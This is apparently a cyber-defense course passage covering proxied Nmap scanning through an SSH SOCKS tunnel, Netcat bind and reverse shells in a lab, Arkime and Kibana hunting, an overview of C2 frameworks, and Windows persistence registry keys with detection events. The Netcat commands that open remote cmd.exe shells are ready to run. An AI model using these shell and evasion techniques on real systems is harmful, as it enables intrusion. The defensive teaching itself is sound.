-D. Creates a local dynamic port forwarding service to the remote device. The argument to this option indicates the local IP address to bind to and the local port to bind to. In this command, the address 0.0.0.0 indicates all addresses on all interfaces.
-N. Tells the process not to execute a remote command upon connecting. This is useful for only forwarding ports.
-f. Indicates that the SSH process that created the dynamic port needs to go to the background, which removes user interaction.

The Linux manual page describes how the tunnel is created:


"This works by allocating a socket to listen to port on the local side, optionally bound to the specified bind_address. Whenever a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine. Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh acts as a SOCKS server."


This tunnel is created to form a proxy SOCKS4 through which traffic from another application, in this case Nmap, is transmitted. An examination of the configuration file proxychains reveals that it sends traffic through the localhost port 9050, which was created by the command.


4. Execute the same scan again, but this time, direct all traffic through the proxy SOCKS4 created by the SSH tunnel.
(trainee@red-kali)- [~] $ proxychains nmap -Pn --top-ports 25 128.0.7.25



This command sends the network traffic created by the Nmap scan through the local port 9050 to the proxy SOCKS4 to the destination at 128.0.7.25, while appearing to originate from the proxy itself at 128.0.7.207. 

![image](https://github.com/user-attachments/assets/46174699-4723-45ae-956f-01fc9567be51)

The process takes about 5 minutes to fully execute. For attacks in which the timing of the arriving traffic is important, especially in the case of an exploit involving a race condition, this time delay is inexcusable on the part of the attacker.


In such a case, attackers choose an alternative course of action to circumvent this problem. One option is to obtain a single-use attacking device that is not proxied, with the understanding that the activity is collected and logged. Anothe r option is  to script and schedule an attack that executes from a node further forward in the communication stream. This option is non-interactive but mitigates any time delay problems created by proxy use. 

![image](https://github.com/user-attachments/assets/de532af6-2210-4782-800c-eaf6c189efb4)

Several timeout errors are initially displayed, but the scan executes. A few timeout errors are returned after the scan has completed.

![image](https://github.com/user-attachments/assets/4309bf60-5386-411a-8586-99541f650130)

The same output returns, but the traffic flow is different when the second command is executed, which is seen in an examination of a capture of the network traffic which follows.

![image](https://github.com/user-attachments/assets/3599b0fa-bec3-41cd-88e9-39242919a061)


------------------------------------------------

Reviewing Network Logs
Since two network scans were issued from the attacker's workstation, a network capture to observe the differences between the two from the perspective of a defender's network sensor can be examined. Reviewing captures such as these is a routine task when conducting hunt or response actions to known threat activity. 

﻿

Use Arkime to examine the traffic produced by the normal and proxied scans conducted. In this inspection, recognize that the identity of the attacking workstation is obfuscated during the second scan.

Workflow


1. Log in to the win-hunt VM using the following credentials:
Username: trainee
Password: CyberTraining1!



2. Open the Arkime bookmark from Chrome, and log in using the following credentials:
Username: trainee
Password: CyberTraining1!



3. Set Time Range to a range that encompasses the network scans previously completed.


![image](https://github.com/user-attachments/assets/079ef903-2ba8-4a1a-b07c-99d7ac9f101b)

4. Set the following filter to find the network traffic of the scans recently completed:
ip.dst == 172.35.3.3 && ip.src == 128.0.7.205



This filter finds the sessions from the attacking workstation that are communicating with the mission partner's SMTP server.


The sessions view of Arkime only shows traffic from full TCP-connected sessions. Only the packets sent to open ports are visible, as the packets from all the filtered ports are dropped by the host.


The IP address of the SMTP server is 172.35.3.3. Due to network translation, the address which the attacker was able to see was 128.0.7.25, to which the Nmap scans were directed.

![image](https://github.com/user-attachments/assets/6e429a31-7b04-4608-9a77-bed8b8433f44)

5. Replace the IP address of the attacking workstation with the IP address of the proxy to observe the second scan.
ip.dst == 172.35.3.3 && ip.src == 128.0.7.207

![image](https://github.com/user-attachments/assets/99e4eab0-ce0c-4f7e-999d-734130d7059c)

The output is otherwise similar, but the source address is that of the proxy, and there is no other indication in the traffic that the scan originated on the other device. If a threat actor is practicing appropriate tradecraft, the logs of this second scan are all that a defender works from. If an appropriately resourced attacker conducts reconnaissance from one proxy and exploitation from a different proxy, the task of coordinating defenses against an entity becomes extremely complicated.


As an analyst or defender, if the profile of potential threats includes such sophisticated actors, a far more effective strategy is to defend against the tradecraft itself, rather than identify the source of the threat.

--------------------------------------------------------------------------

####### CDAH-M8L1-Interactive Shells #######


Establish a Bind Shell
Establish a bind shell with the target machine from an attacker's perspective. In the following tasks, the ch-tech-1 Virtual Machine (VM) is used at the attacker host and the ch-tech-2 VM is used at the target (victim) host. 

﻿

Workflow

﻿

1. Log in to the ch-tech-1 VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Windows PowerShell from the taskbar.

﻿

3. From the PowerShell session, access Netcat (nc.exe), located on the desktop, by executing the following command:

PS C:\Users\trainee\> cd Desktop
PS C:\Users\trainee\Desktop> .\nc.exe
﻿

NOTE: The following screen indicates success of the Netcat executable:

![image](https://github.com/user-attachments/assets/f918617c-d961-4d67-b0a9-2fc94a25a3d4)


4. Log in to the ch-tech-2 VM using the following credentials:
Username: trey.pitts
Password: Password123



5. Open Windows PowerShell from the taskbar.


6. From the PowerShell session, access Netcat (nc.exe), located on the desktop, by executing the following command:
PS C:\Users\trey.pitts> cd Desktop
PS C:\Users\trey.pitts\Desktop> .\nc.exe



7. From the Cmd line, execute the following command:
Cmd line: -nvlp 4444 -e cmd.exe



The following command opens a listener on port 4444 on the ch-tech-2 VM:

![image](https://github.com/user-attachments/assets/6a3cce30-a5ec-44e9-99e4-8da38ffded60)

The open listener defines that anyone who connects to the ch-tech-2 VM via Transmission Control Protocol (TCP) port 4444 presents with a Command-Line Interface (CLI).


8. In a new PowerShell window, execute the following command:
PS C:\Users\trey.pitts> netstat -ano



This command provides a table containing TCP connections with IP address, port, and process number:

![image](https://github.com/user-attachments/assets/7371cd7a-bc1c-42a2-ab3c-5d65d00eeeb6)

Notice listening port 4444 is associated with Process ID (PID) 3728. This process is the Netcat listener and is different in each lab setting.


9. Return to the ch-tech-1 VM. From the Cmd line, execute the following command:
Cmd line: -nv 172.35.13.3 4444



Successful execution of the command provides CLI access to user trey.pitts:

![image](https://github.com/user-attachments/assets/6bd35a60-1814-4b7e-a739-5eb70a3d6871)

Using Netcat, a bind shell session has been created on ch-tech-2 and connected to from the ch-tech-1 VM. The user of the ch-tech-1 VM now has CLI access to the user trey.pitts. It is through this method that an attacker, once access has been gained to a system, can open a listener, access CLI remotely, and retrieve data. It is important to remember that no firewalls or NAT are present, making the bind shell possible.


10. Return to the ch-tech-2 VM. In the PowerShell window that is not running Netcat, execute the following command to recheck the network connections:
PS C:\Users\trey.pitts> netstat -ano

![image](https://github.com/user-attachments/assets/2bbc5e5f-e476-43d2-a66b-f98acf085e67)

Notice port 4444 is no longer in a listening state and includes the IP address of the attacker machine (172.35.13.2) in an established state.


11. Enter exit to close the PowerShell session. 

![image](https://github.com/user-attachments/assets/a9938569-c813-4d8d-aa7f-83b3f851c79c)

------------------------------------------------

stablish a Reverse Shell
Establish a reverse shell with the target machine from an attacker's perspective. The ch-tech-1 VM is used as the attacker host, and the ch-tech-2 VM is used as the target (victim) host. 

﻿

Workflow

﻿

1. Log in to the ch-tech-1 VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Windows PowerShell from the taskbar.

﻿

3. From the PowerShell session, access Netcat (nc.exe), located on the desktop, by executing the following command:

PS C:\Users\trainee\Desktop> .\nc.exe
﻿

4. From the Cmd line, execute the following command:

Cmd line: -nvlp 4444
﻿

NOTE: Since this is a reverse shell, the listener is set up on our attacker machine and the communications are initiated from the target machine. 

﻿

5. Log in to the ch-tech-2 VM using the following credentials:

Username: trey.pitts
Password: Password123
﻿

6. Open Windows PowerShell from the taskbar.

﻿

7. From the PowerShell session, access Netcat (nc.exe), located on the desktop, by executing the following command:

PS C:\Users\trey.pitts\Desktop> .\nc.exe
﻿

8. From the Cmd line, execute the following command:

Cmd line: -nv 172.35.13.2 4444 -e cmd.exe
﻿

This establishes a connection to ch-tech-1 (172.35.13.2):

![image](https://github.com/user-attachments/assets/153844f9-fabc-4bea-a46d-29a08580c298)

9. Return to the ch-tech-1 VM. Figure 8.1-10 shows the Windows PowerShell session:

![image](https://github.com/user-attachments/assets/1ca38475-bf81-4df2-be9b-7380e90b50bd)

This command is similar to the bind shell, however, the -e flag passes the cmd.exe as a parameter to it allowing a reverse shell to establish. Notice we now have access to the CLI on ch-tech-2 as user trey.pitts. Using a reverse shell the connection is established from the target machine, avoiding detection and firewall rules. 

![image](https://github.com/user-attachments/assets/ea265bbf-d52a-44db-aa47-73fb72f10a73)


--------------------------------------

Identifying Suspicious Shell Activity in Event Logs
Use Kibana in the Elastic Stack to identify suspicious destination IP addresses. Uncommon destination IP addresses can be indicative of persistence of the adversary; this task creates visualizations to analyze and detect suspicious destination IP addresses.

﻿

Workflow

﻿

1. Log in to the win-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Google Chrome from the taskbar.

﻿

3. Open the Discover - Elastic bookmark.

﻿

4. Access Security Onion and Elastic Stack using the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

5. Select the three-line menu on the left, within the menu, under Analytics, select Visualize Library.

﻿

6. Within Visualize Library, select Create Visualization.

﻿

7. Within New visualization, select Aggregation Based > Data Table.

﻿

8. Within New Data table/Choose a source, select *:so-*. The table looks like Figure 8.1-13:

![image](https://github.com/user-attachments/assets/2253442c-f3ce-4d25-8479-b69e220411c5)

NOTE: The count is different from the screenshot due to Kibana's defaulting to a timeframe of Last 24 hours. 


9. Set the time and date range to: Nov 1, 2021 @ 00:00:00.000 -> Nov 8, 2021 @ 23:30:00.000.


10. Under Buckets, select Add. Add a bucket with the following selections:
Split rows
Aggregation: Terms
Field: agent.hostname.keyword
Metric: Count
Order: Descending 
Size: 100

This bucket adds the hostnames of host reporting to Elastic Stack to the data table.


11. Under Buckets, select Add. Add a bucket with the following selections:
Split rows
Aggregation: Terms
Field: destination.port
Metric: Count
Order: Descending 
Size: 100

This bucket adds the destination ports of all communications from the hosts reporting to Elastic Stack to the data table.


12. Under Buckets, select Add. Add a bucket with the following selections:
Split rows
Aggregation: Terms
Field: destination.ip
Metric: Count
Order: Descending 
Size: 100

This bucket adds the destination IP addresses of all communications from the hosts reporting to Elastic Stack to the data table.

![image](https://github.com/user-attachments/assets/6f8d44bb-fd1a-4dd8-a6af-a7b82b7ff344)

This can help visualize the logs that contain vital communication information. During a hunt or investigation, this can be used to quickly analyze destination IP addresses and ports to identify potentially suspicious activity. IP addresses and ports that populate with significantly less frequency should be reviewed immediately to determine if the activity is expected.  


The type of process used by hosts can help to identify suspicious activity. An unexpected or mysterious process can be quickly identified by the communications collected by the SIEM.


13. Under Buckets, select Add. Add a bucket with the following selections:
Split rows
Aggregation: Terms
Field: process.name.keyword
Metric: Count
Order: Descending 
Size: 100

This bucket adds the process name utilized in the communications from the hosts reporting to Elastic Stack to the data table.


![image](https://github.com/user-attachments/assets/d5c9d5ea-568d-47b5-a3fc-edc990e9cd81)

14. Navigate to page 2 of the Data Table, as shown in Figure 8.1-16. Notice the two entries for the use of nc.exe on port 4444, the executable for Netcat. Netcat was used to create bind and reverse shells in this lesson. 

![image](https://github.com/user-attachments/assets/194a22f4-c121-4656-9944-48f6f8dba312)

------------------------------------------------

Suspicious Activity in the VCCH Network
The network team has discovered a few large communications occurring on the city hall network occurring over a 7-day span (Nov 2, 2021 @ 00:00:00.000 -> Nov 10, 2021 @ 00:00:00.000). Large communications are rare, however, as they consume a large amount of bandwidth triggering the network team to investigate. The network team needs the help of security analysts to look into the bandwidth anomalies and determine if the activity is suspicious. Begin by accessing VCCH's Elastic Stack via the use of the win-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

After accessing the win-hunt VM, access Security Onion and Elastic Stack using the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

After accessing Elastic Stack, create a Data Table to aid in the investigation of the questionable network activity. 

![image](https://github.com/user-attachments/assets/3671259a-02af-4efe-832f-ea3267d69b91)


![image](https://github.com/user-attachments/assets/de161437-3363-4b89-a867-82e7dc307ef2)

![image](https://github.com/user-attachments/assets/6df87ba9-fe38-441a-bec1-ff19ac66d9ea)


--------------------------------------------------

nc.exe Occurrences
Apply a filter to the table to filter by process.name.keyword: nc.exe. The count of nc.exe then becomes visible. 

﻿

Once the count has been obtained, the filter can be removed to return to the data table. 


![image](https://github.com/user-attachments/assets/178bd8d3-6215-4ddc-a5fd-fb74e4a9295e)


Suspicious, Non-Standard, Listening Destination Port 


There are a few suspicious ports within the table (port 4444 and 53, for example); however, 8088 is the focus of this investigation. 

![image](https://github.com/user-attachments/assets/28307023-0c82-4651-bae7-6df07489df99)

Port 8088 was used twice by the Netcat executable. As previously stated, often the adversary uses a non-standard listening port, such as port 8088, to conduct HTTPS traffic. It is important to note that the existence of the Netcat executable may not be suspicious. Netcat can be used to do remote network maintenance across the enterprise. The Netcat executable paired with the non-standard port 8088 is suspicious and cause for investigation. 

![image](https://github.com/user-attachments/assets/73753707-4486-46c4-926a-b93b1d19363d)

![image](https://github.com/user-attachments/assets/a2639bba-4962-4b5c-b462-a6b8b7ee31f6)

Suspicious IP Address
The IP address 128.0.7.206 appears only once in the table. The IP address is not similar to any of the other addresses listed on the table and is using an executable that is a known tool that can be leveraged by adversaries. 

![image](https://github.com/user-attachments/assets/350a9be9-49ec-44b1-9299-7a3b65c79012)

Investigation Conclusion
Through the use and analysis of Elastic Stack and Kibana, an outlier data point within network communications has been identified. The outlier is connected via a non-standard port (8088) and a unique IP address (128.0.7.206), relative to the other IP addresses found in the collected logs. The ch-tech-1 VM needs to be further investigated for adversarial persistence and to identify what data may have been compromised through the use of an established shell. 

-----------------------------------------------

##### CDAH-M8L3 C2 Frameworks #####


Popular C2 Frameworks
Command and Control (C2) is the set of tools and functionality used by the adversary, aimed at continuing communication from an exploited and accessed host or machine. C2 most commonly includes communication paths and methods connecting the victim host to the adversary's system. The communication paths are designed to be covert and to mimic expected network traffic in an effort to avoid detection from the victim's network. Within the communication pipeline flows valuable data, stolen from the victim machine. 

﻿

C2 Techniques 
﻿

As of late 2021, MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) lists 16 C2 techniques in recent cyber campaigns. The C2 techniques contain a variety of sub-techniques and may be leveraged by open-source frameworks.


![image](https://github.com/user-attachments/assets/ca8402cd-ddc6-49a3-a7cd-f50cf91512e8)

----------------------------------

Popular C2 Frameworks
There are significant open-source resources, tools, and methods for C2. Most open-source C2 frameworks are located in the post-exploitation phase of the Cyber Kill Chain® and are focused on two primary goals: detection avoidance and establishing communications. A few of the most popular C2 exploitation frameworks are described below. This is not an exhaustive list, cybersecurity and the common techniques in use are in a constant state of evolution and change.

﻿

Merlin
Support of C2 protocols over Hypertext Transfer Protocol (HTTP) and Transport Layer Security (TLS).
Support on Windows, Linux, macOS Operation Systems (OS). If it works on Go, it works with Merlin.
Enables Domain Fronting, a technique used to exploit routing schemes to obfuscate intended destination of HTTPS traffic. 
C2 traffic message padding - adding data to a message/communication to avoid detections based on message/communication size.
Empire
﻿

Empire is a post-exploitation framework that includes pure-PowerShell Windows agents, Python 3.x Linux/OS X agents, and C# agents. The framework offers cryptologically secure communications and flexible architecture. Empire includes the following features:

Ability to run PowerShell agents with the use of PowerShell.exe to avoid detection. 
Rapidly deployable post-exploitation modules that include key loggers and Mimikatz. 
SHAD0W
﻿

SHAD0W is a modular C2 framework designed to successfully operate on mature environments. It uses a range of methods to evade Endpoint Detection and Response (EDR) and Anti-Virus (AV) while allowing the operator to continue using tooling and tradecraft they are familiar with. SHAD0W includes the following features:

Docker compatible; runs inside of Docker allowing for cross-platform usage.
Modular design allows for users to create new modules to interact and task beacons.
HTTP C2 Communication - All traffic is encrypted and sent using HTTPS.
Beacons are generated using different tools or formats (such as Executable [.exe] and PowerShell).
Enables process injection. 
Build Your Own Botnet
﻿

Build Your Own Botnet (BYOB) is an open-source, post-exploitation, pre-built, C2 server framework for students, researchers, and developers. BYOB is a beginner-friendly tool designed to be intuitive for those learning about offensive cybersecurity. BYOB includes the following features:

C2 Server with an intuitive, user-friendly, User Interface (UI).
Custom payload generator for a variety of platforms.
Allows students and developers to implement their own code and add features without the requirement of writing an original C2 server. 

--------------------------------

Detecting Popular C2 Frameworks
C2 frameworks often leave behind artifacts and other pieces of evidence of their use behind. It is a tricky task to properly identify the artifacts and the persistence of the adversary in the network. Below are a few current C2 detection methods:

﻿

Detection in Network Traffic
﻿

Detecting C2 frameworks in network traffic refers to the auditing, analysis, and observation of packet flows across the network. Packets are analyzed by metrics such as size, frequency of being sent/received, and source/destination. When a packet is too large or small, communicates on a consistent interval, or to a suspicious destination, an alert is triggered, requiring analysts to investigate further. A key component of this detection method is close communication and coordination with network analysts to identify suspicious network traffic. 

﻿

Real Intelligence Threat Analytics
﻿

Real Intelligence Threat Analytics (RITA) is an open-source, machine-learning, tool that enables C2 beacon detection in network traffic, through ingestion of Zeek logs. RITA features include:

Searching for signs of beaconing behavior in and out of network.
Searching for signs of Domain Name System (DNS) tunneling by DNS based covert channels.
Querying blacklists to search for suspicious domains and hosts.
Detection Using Process Auditing 
﻿

Detection is accomplished by auditing and analyzing processes utilized by hosts on the network. It is common for hosts that have been exploited to use uncommon processes or exploit insecure processes, such as rundll32.exe. Detection by process auditing requires using security tools (such as Elastic Stack) to monitor all processes being executed across the network. As mentioned, rundll32.exe is a common Dynamic Link Library (DLL) executable, responsible to execute control panel item files. A key characteristic in detection by process auditing includes awareness of processes that are leveraged by the adversary. These processes need to be included in detection rules.

﻿

Detection by API Monitoring
﻿

Detection is done by monitoring API functions and events. These tools and techniques leveraged by the adversary often spawn events within Windows Event Viewer or Sysmon. The spawned events are monitored to detect activity. The spawned events may include the following activities:

Sysmon Event ID 3: Network connection
The network connection event logs TCP/User Datagram Protocol (UDP) connections on the machine. Each connection is linked to a process through the ProcessId and ProcessGUID fields. The event also contains the source and destination host names, Internet Protocol (IP) addresses, port numbers, and IPv6 status.
Sysmon Event ID 10: ProcessAccess
Sysmon 10 is logged when a process opens another process. Often when a process opens another process it is followed by queries or modifications in the address space of the target process. Sysmon 10 enables the detection of tools or functionality that read memory of processes in an attempt to steal credentials. 
Windows Event ID 4656: A handle to an object was requested
According to Microsoft, "event 4656 indicates that specific access was requested for an object. The object could be a file system, kernel, or registry object, or a file system object on removable storage or a device. Event 4656 can indicate if an adversary is attempting to utilize or manipulate any of the listed objects in an effort to maintain persistence or create C2 communications." 

------------------------------------------------


Communication Interval
The two filters in place to display data only from host ch-dev-3 to destination IP address 128.07.205 are shown below. 

﻿
![image](https://github.com/user-attachments/assets/6e0ac9cd-33f4-4b8a-bd45-22efdfabc4c3)

﻿

Figure 8.3-11

﻿

Communications between host ch-dev-3 and 128.07.205 occurred on a 5-minute interval, establishing communications three times every 15 minutes. The visualization is a clear indication of a repeated connection between a potentially compromised host and an external location. The connections need to be investigated further to determine if the activity is malicious. 

﻿
![image](https://github.com/user-attachments/assets/79ec7937-fedf-48ac-911c-40dd0045bf35)

﻿

Figure 8.3-12

﻿

Review Log Information
﻿

Review the information collected in the log files to answer the subsequent knowledge checks. 

------------------------------------------------

Log Data
The information collected in the log files within Elastic Stack is shown below.

﻿

Sysmon Event 3
﻿

The event.code field contains the event ID that was collected. 


![image](https://github.com/user-attachments/assets/ba09c743-daa4-4510-81ad-939d5c6f0464)


The event.module field contains the type of log file or tool used to collect the log file. 

![image](https://github.com/user-attachments/assets/f86eb8c8-55b8-4b2e-96f4-f3d1c19a2eb3)

Related User


The related.user field contains the user name associated with the log file. 

![image](https://github.com/user-attachments/assets/f30860ef-9b2a-4b1c-bdcc-f17dae95d7ea)

Destination IP Address - Country of Origin


The destination.geo.country_name field contains the country of origin for the destination IP address. 

![image](https://github.com/user-attachments/assets/8dc88d77-60a2-4d9f-a83d-f85bb440a4da)

------------------------------------

Analysis Conclusion
Through the use and analysis of Elastic Stack, an outlier data point within network communications has been identified. The outlier has a unique IP address (128.0.7.205), relative to the other IP addresses in the collected logs, and has established frequent and consistent communications occurring every five minutes.

﻿

Due to the use of PowerShell, it is likely that the compromised machine has the Empire C2 framework. The VM ch-dev-3 needs to be further investigated for adversarial persistence and to identify what data has been compromised and is now experiencing C2 activity. 

---------------------------------------------------

##### CDAH-M8L4-Persisting in Windows Artifacts #####

Windows Persistence Overview
Persistence refers to the installation of an implant, backdoor, or access method which is able to restart or reinstall upon deactivation. The most common example of persistence is the ability of malicious code to survive and restart after a device reboots. Adversaries often configure persistence mechanisms on compromised devices in order to maintain a foothold in a network so they can return for future operations. If a compromised device is stable and rarely reboots, such as in the case of network devices — adversaries may opt out of configuring a persistence mechanism and leave only their malicious code running in memory. Malicious code that only exists in memory is much harder to detect by defenders, but also cannot survive a reboot. In order for adversaries to maintain persistence, artifacts must be saved on the system, which restarts the malicious code. Adversaries use many different persistence methods to keep their foothold in environments they breach. Understanding persistence and knowing the common methods can help defenders detect and prevent adversaries from keeping a foothold in their client environments.

﻿

The MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) tactic for persistence is TA0003. Below is a list of the techniques and sub-techniques this lesson covers:

T1547.001: Registry Run Keys/Startup Folder
T1037.001: Logon Script (Windows)
T1543.003: Windows Service
T1053.005: Scheduled Task
Each of these techniques is described in detail in the tasks that follow. 

-------------------

Registry Run Keys/Startup Folder
Registry Run Keys
﻿

The registry is one of the oldest persistence techniques used by adversaries. Due to the large and complex nature of the registry, it makes a great hiding place for adversary persistence.

﻿

In Figure 8.4-1, the following registry key is selected: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

﻿

This registry key contains a non-default value of type REG_SZ, which indicates the data is an unstructured string. The highlighted process, VMware User Process, contains the data: "C:|Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr.

﻿

This registry key represents one of the oldest persistence techniques in the history of Windows: the data field of any value in a run key points to an executable that is launched on user login. In this example, vmtoolsd.exe is a legitimate executable associated with VMware. This process is executed whenever a user logs in to the device. An attacker, however, can add a value of their choice to these keys in order to execute their malware.

﻿![image](https://github.com/user-attachments/assets/075c5827-3ca7-46fa-826f-1b518ac55a98)


The registry keys HKCU\SOFTWARE\Microsoft\CurrentVersion\Run and HKCU\SOFTWARE\Microsoft\CurrentVersion\RunOnce hold values that indicate commands that should be run when that user logs in. The most common registry keys associated with this behavior are listed below. This list includes the keys that are applied to all users (HKLM) and the ones associated with the current user (HKCU).
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx (not created by default on Windows Vista and newer, but can be created by adversaries or system administrators)
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Run (legacy; older versions of Windows)

The following list shows registry keys used to set Startup folder items for persistence:
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders

The following list shows registry keys used to control automatic startup of services during boot:
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce
HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices
HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices

Policy settings can be set to specify startup programs in these registry keys:
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

Custom actions can be added to the Winlogon key to add additional actions that occur on a computer system running Windows 7 and later:
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell

Programs can be listed in the load value of HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows to load when any user logs on.


Adversaries have also been seen to modify the BootExecute value of HKLM\SYSTEM\CurrentControlSet\Control\Session Manager from the default autocheck — autochk * to other programs. The default value is used for file system integrity checks after an abnormal shutdown.


Not all of the above keys and values may be present on a system but may be created by adversaries to enable that feature. Since Windows applications also use the registry to store configuration data, there are application-specific registry keys that may also be abused by attackers to run malicious code and maintain persistence.


Startup Folder


The Windows startup folder is also an old method of persistence. Any file placed in C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\ is launched automatically whenever any user logs in. It is less common for this method to be used because it is easily detected by anti-virus software or even an observant technician.


Detecting Persistence via Registry Run Keys/Startup Folder


Many environments have anti-virus software installed on endpoints that monitor the well-known autorun registry keys and startup folders. For manual detection on the host, use the Sysinternal s Autoruns too l. For detecting malicious run key activity, use Sysmon event Identifier (ID) 12 (RegistryEvent [Object create and delete]), 13 (RegistryEvent [Value Set]), and 14 (RegistryEvent). Sysmon event ID 11 (FileCreate) can be used to detect the creation of files in startup folders. These methods are covered in a lab later in the lesson.

-----------------

Logon Script (Windows)
Adversaries also use Windows logon scripts to maintain persistence by executing a script during logon initialization. Logon scripts can be run when a specific user  — or group of users — log on to a Windows system. To set up execution of a logon script, the adversary adds the path to the script to the HKCU\Environment\UserInitMprLogonScript registry key.

﻿

Detecting Persistence via Logon Script (Windows)
﻿

To detect suspicious persistence use the following Sysmon event IDs:

Sysmon event ID 12 (RegistryEvent [Object create and delete])
Sysmon event ID 13 (RegistryEvent [Value Set])
Sysmon event ID 14 (RegistryEvent [Key and Value Rename])
Creating a targeted alert or report specifically monitoring HKCU\Environment\UserInitMprLogonScript reduces the amount of noise in large networks.

﻿

For device investigations, the Autoruns tool can be used to spot logon scripts.

------------------------

Windows Service
Services are computer programs that run in the background. Instead of interacting with the user directly, the intention is to add increased functionality to the Windows Operating System (OS). They offer system resources to accomplish background tasks like handling remote procedure calls or internet information services. Not every executable can be registered as a Windows service; they must be able to interact with the Windows Service Control Manager (services.exe) or they are killed on startup.

﻿

Adversaries often create a new service or modify an existing service as a way to maintain persistence. Services can be modified using the reg command or the sc command. Information about services is stored in the HKLM\SYSTEM\CurrentControlSet\Services registry key.

﻿

Detecting Persistence via Windows Service
﻿

If a service is modified those changes are reflected in the HKLM\SYSTEM\CurrentControlSet\Services registry key. This key can be monitored using the following:

Sysmon event ID 12 (RegistryEvent [Object create and delete])
Sysmon event ID 13 (RegistryEvent [Value Set])
Sysmon event ID 14 (RegistryEvent [Key and Value Rename])
Checking for a suspicious process call tree is another method of detection. Often valid services can be used to call malicious files. For example, Microsoft Word launching a malicious script. This can be detected using Sysmon event ID 1.

﻿

A useful event ID for monitoring service activity is Windows event ID 4697 (A service was installed in the system). Monitoring for this event is recommended, especially on high-value assets or computers, because a new service installation should be planned and expected. Unexpected service installation should trigger an alert.

﻿

Listed below are Microsoft's security monitoring recommendations for this event ID:

Monitor for all events where Service File Name is not located in %windir% or Program Files/Program Files (x86) folders. Typically new services are located in these folders.
Report all Service Type equals 0x1 (KernelDriver), 0x2 (FileSystemDriver), or 0x8 (RecognizerDriver). These service types start first and have almost unlimited access to the OS from the beginning of the OS startup. These types are rarely installed.
Report all Service Start Type equals 0 (Boot) or 1 (System). These service start types are used by drivers, which have unlimited access to the OS.
Report all Service Start Type equals 4 (Disabled). It is not common to install a new service in the Disabled state.
Report all Service Account not equals localSystem, localService or networkService to identify services that are running under a user account.
Autoruns is a useful tool when triaging a machine for persistence. Not only does it list all the information for Windows autorun locations but it also sends the hash of each file to VirusTotal to be compared against their database of known good and known m alicious binarie s. Autoruns can also submit the image (actual file) of unknown hashes, but it is not configured to do so by default. Submitting the image of unknow n hashes to V irusTotal should only be done if the network policy allows it.


------------------

Scheduled Task
Starting with Windows 95, Microsoft packaged a task scheduler with its OS to start and restart predefined tasks at pre-set times. This makes it an ideal tool for an adversary to obtain persistence. For example, an adversary sets up a scheduled task to execute a script regularly or upon startup that checks to make sure the backdoor is active and if it is not, to have the script activate it.

﻿

Detecting Persistence via Scheduled Tasks
﻿

Monitor process execution from svchost.exe (Windows 10) and taskeng.exe (all versions older than Windows 10).

﻿

There are several Windows event IDs, listed below, that can be utilized to hunt for malicious scheduled task activity.

Event ID 106 on Windows 7, Server 2008 R2 — Scheduled task registered
Event ID 140 on Windows 7, Server 2008 R2/4702 on Windows 10, Server 2016 — Scheduled task updated
Event ID 141 on Windows 7, Server 2008 R2/4699 on Windows 10, Server 2016 — Scheduled task deleted
Event ID 4698 on Windows 10, Server 2016 — Scheduled task created
Event ID 4700 on Windows 10, Server 2016 — Scheduled task enabled
Event ID 4701 on Windows 10, Server 2016 — Scheduled task disabled
The Windows Task Scheduler files are stored in %SYSTEMROOT%\System32\Tasks. This location can be monitored for changes in an attempt to detect malicious activity. Autoruns is a useful tool when triaging a host for persistence via scheduled tasks. 

-----------

Challenge: Detecting Windows Persistence
This challenge is a capture-the-flag scenario meant to put the knowledge gained from this lesson to the test.

﻿

The ch-treasr-1 host has been loaded with seven persistence methods. Both Security Onion and direct access to ch-treasr-1 are required to hunt down the persistence methods. Not all of the persistence methods can be found by only hunting in Security Onion or only manually hunting on ch-treasr-1. Observe and take note of the files being executed as well as the location. The flags are Universally Unique Identifiers (UUID) and are located in the files being executed by the persistence. To view a flag, open a command prompt and use the type command. In the following example, the file output is the flag named malware and is located in C:\Downloads.

type C:\Downloads\malware
﻿

The flags look like this: 1FAD2399-DF1F-4C0D-A6C0-4266B725BC5B.

﻿

NOTE: The group of Knowledge Checks that follow this task refers to the challenge, and asks in which persistence method each file and UUID were found. This requires you to take detailed notes. 

﻿------------------------------

#### CDAH-M9L1 Living off the Land ####


Workflow


To see what sort of information an attacker can discover about a machine with simple command execution on it, log in to a Windows domain machine and run a reconnaissance script that has been prepared with several of these commands.


1. Log in to the ch-edu-1 Virtual Machine (VM) using the following credentials:
Username: ksmith
Password: CyberTraining1!



This is one of the domain systems in the mission partner’s network.


